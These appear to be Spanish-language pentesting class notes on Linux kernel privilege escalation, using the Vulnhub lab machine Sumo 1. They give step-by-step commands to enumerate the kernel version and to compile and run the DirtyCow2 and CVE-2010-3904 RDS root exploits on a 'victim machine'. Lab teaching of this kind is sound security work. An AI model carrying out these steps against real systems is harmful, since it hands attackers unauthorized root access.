# Explotación del Kernel

Tags: #Linux #Kernel  #Escalada #Root #Privilegios 

El **Kernel** es la parte central del sistema operativo Linux, que se encarga de administrar los recursos del sistema, como la memoria, los procesos, los archivos y los dispositivos. Debido a su papel crítico en el sistema, cualquier vulnerabilidad en el Kernel puede tener graves consecuencias para la seguridad del sistema.

En versiones antiguas del Kernel de Linux, se han descubierto vulnerabilidades que pueden ser explotadas para permitir a los atacantes obtener acceso de superusuario (**root**) en el sistema.

La elevación de privilegios se refiere a la técnica utilizada por los atacantes para obtener permisos elevados en el sistema, como superusuario (**root**), cuando solo tienen permisos limitados. Por ejemplo, un usuario con permisos limitados en el sistema podría utilizar una vulnerabilidad en el Kernel para obtener acceso de superusuario y, posteriormente, comprometer el sistema.

Las vulnerabilidades del Kernel pueden ser explotadas de varias maneras. Por ejemplo, un atacante podría aprovechar una vulnerabilidad en un controlador de dispositivo para obtener acceso al Kernel y realizar operaciones maliciosas. Otra forma común en que se explotan las vulnerabilidades del Kernel es mediante el uso de técnicas de desbordamiento de búfer, que permiten a los atacantes escribir código malicioso en áreas de memoria reservadas para el Kernel.

Para mitigar el riesgo de vulnerabilidades del Kernel, es importante mantener actualizado el sistema operativo y aplicar parches de seguridad tan pronto como estén disponibles.

A continuación, se os comparte el enlace a la máquina Sumo 1 de Vulnhub, la cual estaremos desplegando en esta clase para mostrar un ejemplo práctico de explotación del Kernel:

- **Máquina Sumo 1**: [https://www.vulnhub.com/entry/sumo-1,480/](https://www.vulnhub.com/entry/sumo-1,480/)

## Kernel

[Linux Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

```bash 
# Descargar 'Linux Suggester' 
❯ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh 

❯ lse.sh -l 1 -i    # Enumerar con la herramienta   
```

```bash 
❯ uname -a    # Mirar la versión del kernel 
	Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
	
Donde: 
	i686   → 32 bits ✅
	i386   → 32 bits ✅
	x86_64 → 64 bits ✅
	amd64  → 64 bits ✅
	arm    → 32 bits (ARM)
	aarch64 → 64 bits (ARM)
```

## DirtyCow2 - Kernel 2.6.22 < 3.9

* [DirtyCow2](https://www.exploit-db.com/exploits/40839)

```bash 
❯ whereis gcc       # Mirar si esta instalado GCC en la máquina víctima 
```

```bash 
❯ gcc -pthread dirty.c -o dirty -lcrypt     # Compilar el binario dentro de la máquina víctima 
❯ chmod +x dirty           # Dar permisos al binario 
❯ ./dirty <passwd>         # Ejecutar el binario y colocar una passwd

NOTA:
	- Este binario nos va a crear un usuario llamado 'firefart' y lo reemplazara en el usuario 'root' 
	- La versión antigua de 'Kernel 3.2.0-23' es explotable
```

```bash 
❯ su firefart           # Colocar la passwd que ingresamos al momento de ejecutarlo y ahora seremos root

❯ ssh firefart@<IP>     # Ingresar por SSH
# Si es un server antiguo usar este comando para conectarse por SSH 
❯ ssh -o HostKeyAlgorithms=ssh-rsa -o PubkeyAcceptedAlgorithms=ssh-rsa firefart@<IP>

❯ ssh-keygen -f "/home/kali/.ssh/known_hosts" -R "<IP>"
# Borra la clave SSH del servidor de tu archivo known_hosts 
```

## Kernel 2.6.36-rc8 RDS privilege escalation exploit

* [CVE-2010-3904](https://www.exploit-db.com/exploits/15285)

```bash 
❯ whereis gcc       # Mirar si esta instalado GCC en la máquina víctima 
```

```bash 
❯ gcc 15285.c -o rds     # Compilar el exploit dentro de la máquina víctima 
❯ chmod +x rds           # Dar permisos al binario 
❯ ./rds                  # Ejecutar el binario y colocar una passwd

NOTA:
	- Funciona para el kernel '2.6.32-21-generic'
	- Se debe de hacer un tratamiento con Python a la shell 
```